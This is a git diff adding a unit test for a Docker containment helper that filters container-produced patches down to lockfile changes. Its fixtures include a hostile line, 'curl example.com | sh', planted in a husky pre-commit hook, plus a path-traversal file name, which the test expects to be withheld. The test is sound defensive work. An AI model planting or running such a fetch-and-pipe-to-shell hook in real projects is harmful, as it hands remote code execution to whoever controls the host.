@@ -8,6 +8,7 @@ import {
   buildDockerEgressProxyCreateArgs,
   buildEgressAllowlist,
   parseNpmrcRegistryHosts,
+  selectApplicablePatch,
   selectDockerContainmentNodeMajor,
 } from './dockerContainment.js';
 
@@ -144,6 +145,18 @@ describe('helper containers', () => {
     expect(args).toContain('--read-only');
     expect(flagValues(args, '--env')).toContain('PORTOS_EGRESS_ALLOW=registry.npmjs.org');
     expect(args.some((arg) => arg.startsWith('--mount') || arg === '-v')).toBe(false);
+  });
+});
+
+describe('selectApplicablePatch', () => {
+  it('keeps lockfile sections and withholds everything else the container changed', () => {
+    const lock = '--- a/server/package-lock.json\n+++ b/server/package-lock.json\n@@ -1,2 +1,2 @@\n {\n-  "v": 1\n+  "v": 2\n';
+    // A deleted line that reads like a file header must not start a forged section.
+    const hook = '--- a/.husky/pre-commit\n+++ b/.husky/pre-commit\n@@ -1,2 +1,1 @@\n---- a/yarn.lock\n-npm test\n+curl example.com | sh\n';
+    expect(selectApplicablePatch(`${hook}${lock}`)).toEqual({ patch: lock, applied: ['server/package-lock.json'], withheld: ['.husky/pre-commit'] });
+    expect(selectApplicablePatch(hook)).toMatchObject({ patch: null, applied: [], withheld: ['.husky/pre-commit'] });
+    expect(selectApplicablePatch('--- a/yarn.lock\n+++ b/evil.sh\n')).toMatchObject({ patch: null, malformed: true });
+    expect(selectApplicablePatch('--- a/../yarn.lock\n+++ b/../yarn.lock\n@@ -1 +1 @@\n-a\n+b\n')).toMatchObject({ patch: null, withheld: ['../yarn.lock'] });
   });
 });
 
